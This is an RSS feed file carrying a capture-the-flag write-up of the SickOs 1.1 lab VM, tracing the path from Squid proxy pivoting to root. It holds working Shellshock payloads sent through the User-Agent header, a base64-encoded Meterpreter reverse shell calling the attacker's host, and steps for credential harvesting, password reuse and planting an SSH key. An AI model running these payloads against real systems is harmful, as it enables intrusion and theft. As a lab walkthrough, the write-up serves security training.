@@ -1,0 +1,376 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Sickos on Cheesy Rumbles</title>
+    <link>http://rastamouse.me/categories/sickos/</link>
+    <description>Recent content in Sickos on Cheesy Rumbles</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sat, 12 Dec 2015 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://rastamouse.me/categories/sickos/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>SickOs 1.1</title>
+      <link>http://rastamouse.me/writeups/2015/sickos-1-1/</link>
+      <pubDate>Sat, 12 Dec 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2015/sickos-1-1/</guid>
+      <description>
+
+&lt;p&gt;This VM was made by some chap called &lt;a href=&#34;https://twitter.com/D4rk36&#34;&gt;D4rk&lt;/a&gt;. His description:  This CTF gives a clear analogy how hacking strategies can be performed on a network to compromise it in a safe environment. This vm is very similar to labs I faced in OSCP. The objective being to compromise the network/machine and gain Administrative/root privileges on them.&lt;/p&gt;
+
+&lt;p&gt;So without further ado&amp;hellip;&lt;/p&gt;
+
+&lt;h2 id=&#34;port-scan:99a1d37ca1e2b0e17a0eda41f22eb05a&#34;&gt;Port Scan&lt;/h2&gt;
+
+&lt;p&gt;As always, smash it with &lt;code&gt;nmap&lt;/code&gt; :)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -p- -A 192.168.50.105
+
+PORT     STATE  SERVICE    VERSION
+22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
+|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
+|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
+3128/tcp open   http-proxy Squid http proxy 3.1.19
+|_http-server-header: squid/3.1.19
+|_http-title: ERROR: The requested URL could not be retrieved
+8080/tcp closed http-proxy
+
+MAC Address: 08:00:27:17:00:0D (Oracle VirtualBox virtual NIC)
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;My first assumption was that I should attempt to connect to port &lt;code&gt;8080&lt;/code&gt;, via the Squid Proxy on &lt;code&gt;3128&lt;/code&gt;.  So I tried to manually connect using the HTTP CONNECT method.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc 192.168.50.105 3128
+CONNECT 127.0.0.1:8080 HTTP/1.0
+
+HTTP/1.0 403 Forbidden
+Server: squid/3.1.19
+Mime-Version: 1.0
+Date: Sat, 12 Dec 2015 13:49:09 GMT
+Content-Type: text/html
+Content-Length: 3020
+X-Squid-Error: ERR_ACCESS_DENIED 0
+Vary: Accept-Language
+Content-Language: en
+X-Cache: MISS from localhost
+X-Cache-Lookup: NONE from localhost:3128
+Via: 1.0 localhost (squid/3.1.19)
+Connection: close
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It seems that maybe there is an ACL in place, which stops us from accessing some ports.  We can connect port 22 via the proxy just fine, but not others.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc 192.168.50.105 3128
+CONNECT 127.0.0.1:22 HTTP/1.0
+
+HTTP/1.0 200 Connection established
+
+SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.1
+
+Protocol mismatch.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I tried using the &lt;code&gt;nmap --proxy&lt;/code&gt; option, but it didn&amp;rsquo;t return any open or closed ports for me.  Whilst I was moaning, &lt;a href=&#34;https://twitter.com/Arr0way&#34;&gt;Arr0way&lt;/a&gt; pointed out that there was an MSF module that I could try instead.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msf &amp;gt; use auxiliary/scanner/http/squid_pivot_scanning
+
+Module options (auxiliary/scanner/http/squid_pivot_scanning):
+
+   Name          Current Setting                                  Required  Description
+   ----          ---------------                                  --------  -----------
+   CANARY_IP     1.2.3.4                                          yes       The IP to check if the proxy always answers positively; the IP should not respond.
+   MANUAL_CHECK  true                                             yes       Stop the scan if server seems to answer positively to every request
+   PORTS         21,80,139,443,445,1433,1521,1723,3389,8080,9100  yes       Ports to scan; must be TCP
+   Proxies                                                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RANGE         127.0.0.1                                        yes       IPs to scan through Squid proxy
+   RHOSTS        192.168.50.105                                   yes       The target address range or CIDR identifier
+   RPORT         3128                                             yes       The target port
+   THREADS       1000                                             yes       The number of concurrent threads
+   VHOST                                                          no        HTTP server virtual host
+
+msf auxiliary(squid_pivot_scanning) &amp;gt; run 
+
+[+] [192.168.50.105] 127.0.0.1 is alive but 21 is CLOSED
+[+] [192.168.50.105] 127.0.0.1:80 seems OPEN
+[+] [192.168.50.105] 127.0.0.1 is alive but 139 is CLOSED
+[+] [192.168.50.105] 127.0.0.1 is alive but 445 is CLOSED
+[+] [192.168.50.105] 127.0.0.1 is alive but 1433 is CLOSED
+[+] [192.168.50.105] 127.0.0.1 is alive but 1521 is CLOSED
+[+] [192.168.50.105] 127.0.0.1 is alive but 1723 is CLOSED
+[+] [192.168.50.105] 127.0.0.1 is alive but 3389 is CLOSED
+[+] [192.168.50.105] 127.0.0.1 is alive but 8080 is CLOSED
+[+] [192.168.50.105] 127.0.0.1 is alive but 9100 is CLOSED
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This worked a lot better as port 80 looked open.  I used &lt;code&gt;cURL&lt;/code&gt;, along with its proxy option to try and talk to the web service.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl -v http://127.0.0.1 -x http://192.168.50.105:3128
+* Rebuilt URL to: http://127.0.0.1/
+* Hostname was NOT found in DNS cache
+*   Trying 192.168.50.105...
+* Connected to 192.168.50.105 (192.168.50.105) port 3128 (#0)
+&amp;gt; GET http://127.0.0.1/ HTTP/1.1
+&amp;gt; User-Agent: curl/7.38.0
+&amp;gt; Host: 127.0.0.1
+&amp;gt; Accept: */*
+&amp;gt; Proxy-Connection: Keep-Alive
+&amp;gt; 
+* HTTP 1.0, assume close after body
+&amp;lt; HTTP/1.0 200 OK
+&amp;lt; Date: Sat, 12 Dec 2015 14:04:49 GMT
+&amp;lt; Server: Apache/2.2.22 (Ubuntu)
+&amp;lt; X-Powered-By: PHP/5.3.10-1ubuntu3.21
+&amp;lt; Vary: Accept-Encoding
+&amp;lt; Content-Length: 21
+&amp;lt; Content-Type: text/html
+&amp;lt; X-Cache: MISS from localhost
+&amp;lt; X-Cache-Lookup: MISS from localhost:3128
+&amp;lt; Via: 1.0 localhost (squid/3.1.19)
+* HTTP/1.0 connection set to keep alive!
+&amp;lt; Connection: keep-alive
+&amp;lt; 
+&amp;lt;h1&amp;gt;
+BLEHHH!!!
+&amp;lt;/h1&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Next I decided to try and find any other pages/directories that might reveal a webapp of some sort.  For this I used &lt;code&gt;dirbuster&lt;/code&gt;.  After a few seconds, it spat out an error concerning responses from pages that don&amp;rsquo;t exist.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/sickos-1/dirbuster.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;It&amp;rsquo;s accessing &lt;code&gt;/cgi-bin/status&lt;/code&gt; and no matter what comes after (i.e. &lt;code&gt;/cgi-bin/status/junk&lt;/code&gt;), the content of the script gets returned.  Dirbuster was getting confused because the uptime was obviously changing between requests.&lt;/p&gt;
+
+&lt;p&gt;Regardless, we have a cgi script that&amp;rsquo;s just screaming shellshock.&lt;/p&gt;
+
+&lt;h2 id=&#34;shellshock:99a1d37ca1e2b0e17a0eda41f22eb05a&#34;&gt;Shellshock&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl http://127.0.0.1/cgi-bin/status -x http://192.168.50.105:3128
+{ &amp;quot;uptime&amp;quot;: &amp;quot; 19:49:53 up 2:41, 1 user, load average: 0.00, 0.01, 0.01&amp;quot;, &amp;quot;kernel&amp;quot;: &amp;quot;Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux&amp;quot;}
+
+root@kali:~# curl http://127.0.0.1/cgi-bin/status -x http://192.168.50.105:3128 -A &amp;quot;() { :; }; echo; /usr/bin/id&amp;quot;
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Let&amp;rsquo;s try and get a reverse shell going - you could use something simple like a &lt;code&gt;nc -e /bin/sh&lt;/code&gt; or TCP reverse shell, but I thought I would spice things up with a bit of Meterpreter.  Confirm there is Python installed&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl http://127.0.0.1/cgi-bin/status -x http://192.168.50.105:3128 -A &amp;quot;() { :; }; echo; /usr/bin/which python&amp;quot;
+/usr/bin/python
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then generate a payload.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.168.50.101 LPORT=4444
+import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,&#39;UTF-8&#39;)}[sys.version_info[0]](&#39;aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCcxOTIuMTY4LjUwLjEwMScsNDQ0NCkpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=&#39;)))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;shell:99a1d37ca1e2b0e17a0eda41f22eb05a&#34;&gt;Shell&lt;/h2&gt;
+
+&lt;p&gt;All you have to do to get this working is &lt;code&gt;/usr/bin/python -c&lt;/code&gt; and copy/paste the &lt;code&gt;msfvenom&lt;/code&gt; output, but make sure you escape the double-quote characters.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl http://127.0.0.1/cgi-bin/status -x http://192.168.50.105:3128 -A &amp;quot;() { :; }; echo; /usr/bin/python -c \&amp;quot;import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,&#39;UTF-8&#39;)}[sys.version_info[0]](&#39;aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCcxOTIuMTY4LjUwLjEwMScsNDQ0NCkpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=&#39;)))&amp;quot;\&amp;quot;
+
+msf exploit(handler) &amp;gt; exploit 
+
+[*] Started reverse handler on 192.168.50.101:4444 
+[*] Starting the payload handler...
+[*] Sending stage (36849 bytes) to 192.168.50.105
+[*] Meterpreter session 1 opened (192.168.50.101:4444 -&amp;gt; 192.168.50.105:40247) at 2015-12-12 14:24:19 +0000
+
+meterpreter &amp;gt; sysinfo 
+Computer     : SickOs
+OS           : Linux 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014
+Architecture : i686
+Meterpreter  : python/python
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After browsing the filesystem, we find some more things in &lt;code&gt;/var/www/&lt;/code&gt;, including the following file:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-rwxrwxrwx 1 root root  109 Dec  5 07:57 connect.py
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This set some alarm bells ringing, but I couldn&amp;rsquo;t find anywhere where this was getting executed as root (e.g a cron).  There is also a directory for &lt;code&gt;wolfcms&lt;/code&gt;, so we check that out.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; ls
+Listing: /var/www/wolfcms
+=========================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100755/rwxr-xr-x  950   fil   2015-12-05 02:13:03 +0000  .htaccess
+100777/rwxrwxrwx  4084  fil   2015-12-06 15:47:22 +0000  CONTRIBUTING.md
+100777/rwxrwxrwx  2405  fil   2015-12-06 15:47:22 +0000  README.md
+100777/rwxrwxrwx  403   fil   2015-12-06 15:47:22 +0000  composer.json
+100777/rwxrwxrwx  3058  fil   2015-12-06 15:47:22 +0000  config.php
+40777/rwxrwxrwx   4096  dir   2015-12-06 15:47:22 +0000  docs
+100777/rwxrwxrwx  894   fil   2015-12-06 15:47:22 +0000  favicon.ico
+100777/rwxrwxrwx  6815  fil   2015-12-06 15:47:22 +0000  index.php
+40777/rwxrwxrwx   4096  dir   2015-12-06 15:47:22 +0000  public
+100777/rwxrwxrwx  0     fil   2015-12-06 15:47:22 +0000  robots.txt
+40777/rwxrwxrwx   4096  dir   2015-12-06 15:47:22 +0000  wolf
+
+
+meterpreter &amp;gt; cat config.php
+&amp;lt;?php 
+
+// Database information:
+// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
+// The path can only be absolute path or :memory:
+// For more info look at: www.php.net/pdo
+
+// Database settings:
+define(&#39;DB_DSN&#39;, &#39;mysql:dbname=wolf;host=localhost;port=3306&#39;);
+define(&#39;DB_USER&#39;, &#39;root&#39;);
+define(&#39;DB_PASS&#39;, &#39;john@123&#39;);
+define(&#39;TABLE_PREFIX&#39;, &#39;&#39;);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We can drop into a shell, connect to &lt;code&gt;mysql&lt;/code&gt; and see if we can find anything interesting.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ mysql -uroot -p
+Enter password: john@123
+
+mysql&amp;gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| wolf               |
++--------------------+
+
+mysql&amp;gt; use wolf;
+
+mysql&amp;gt; show tables;
++-----------------+
+| Tables_in_wolf  |
++-----------------+
+| cron            |
+| layout          |
+| page            |
+| page_part       |
+| page_tag        |
+| permission      |
+| plugin_settings |
+| role            |
+| role_permission |
+| secure_token    |
+| setting         |
+| snippet         |
+| tag             |
+| user            |
+| user_role       |
++-----------------+
+
+mysql&amp;gt; select * from user;
++----+---------------+--------------------+----------+----------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------+----------+---------------------+--------------+---------------+---------------------+---------------------+---------------+---------------+
+| id | name          | email              | username | password                                                                                                                         | salt                                                             | language | last_login          | last_failure | failure_count | created_on          | updated_on          | created_by_id | updated_by_id |
++----+---------------+--------------------+----------+----------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------+----------+---------------------+--------------+---------------+---------------------+---------------------+---------------+---------------+
+|  1 | Administrator | admin@yoursite.com | admin    | 3a1be46a798dce0d880f633ce195b676839a0ce344c917a7ea1270816dcb649ce1e2b811b56fe93c9d3c4e679151180129ee9483ea39bff4d4578c4be6c77e1f | 6806b774443f2c34231eceddf156a42d3c26a2b5219ee9d55f5e3c9aea534167 | en       | 2015-12-05 07:47:16 | NULL         |             0 | 2015-12-05 06:25:06 | 2015-12-05 07:47:16 |             1 |          NULL |
++----+---------------+--------------------+----------+----------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------+----------+---------------------+--------------+---------------+---------------------+---------------------+---------------+---------------+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And we can quickly grab the mysql users.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;mysql&amp;gt; select * from mysql.user;
++-----------+------------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+
+| Host      | User             | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin | authentication_string |
++-----------+------------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+
+| localhost | root             | *A7A20B93EC076311A63BF86B5C705B25C054DD77 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
+| sickos    | root             | *A7A20B93EC076311A63BF86B5C705B25C054DD77 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
+| 127.0.0.1 | root             | *A7A20B93EC076311A63BF86B5C705B25C054DD77 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
+| ::1       | root             | *A7A20B93EC076311A63BF86B5C705B25C054DD77 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
+| localhost | debian-sys-maint | *CB98094782C386F2459D65D97B17D1DE15D1654B | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 |        | NULL                  |
++-----------+------------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We notice that all the users are using the same hash, therefore the same password.  Sickos is also a user on the OS, so maybe they are using the same password?&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ su sickos
+Password: john@123
+bash: no job control in this shell
+sickos@SickOs:~$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Awesome.  Even though SSH is running on the system, Sickos has no keys.  So I used &lt;code&gt;ssh-keygen&lt;/code&gt; to create a new set of keys and the &lt;code&gt;.ssh&lt;/code&gt; directory, then echo&amp;rsquo;d my kali public key into the authorized_keys file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ssh sickos@192.168.50.105
+Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)
+
+sickos@SickOs:~$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We see straight away that sickos is a member of the sudo group.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;sickos@SickOs:~$ id
+uid=1000(sickos) gid=1000(sickos) groups=1000(sickos),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
+
+sickos@SickOs:~$ sudo -l
+[sudo] password for sickos: 
+Matching Defaults entries for sickos on this host:
+    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User sickos may run the following commands on this host:
+    (ALL : ALL) ALL
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Which makes elevation trivial.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@SickOs:~# hostname; id
+SickOs
+uid=0(root) gid=0(root) groups=0(root)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;flag:99a1d37ca1e2b0e17a0eda41f22eb05a&#34;&gt;Flag&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@SickOs:~# cat /root/a0216ea4d51874464078c618298b1367.txt 
+If you are viewing this!!
+
+ROOT!
+
+You have Succesfully completed SickOS1.1.
+Thanks for Trying
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
